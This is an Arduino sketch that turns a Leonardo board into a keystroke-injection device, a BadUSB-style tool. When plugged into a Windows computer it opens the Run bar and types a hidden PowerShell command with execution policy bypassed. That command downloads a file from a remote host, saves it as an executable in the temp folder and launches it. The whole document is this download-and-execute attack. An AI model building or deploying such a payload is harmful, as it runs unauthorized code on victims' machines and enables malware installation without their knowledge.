#include <phukdlib_leonardo.h>
#define kbd_es_es

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarMSWIN("powershell -NoP -NonI -W Hidden -Exec Bypass \"IEX (New-Object System.Net.WebClient).DownloadFile('http://example.com/bob.txt',\\\"$env:temp\\bob.exe\\\"); Start-Process \\\"$env:temp\\bob.exe\\\"\"");
  delay(3000);
  while(1);
}
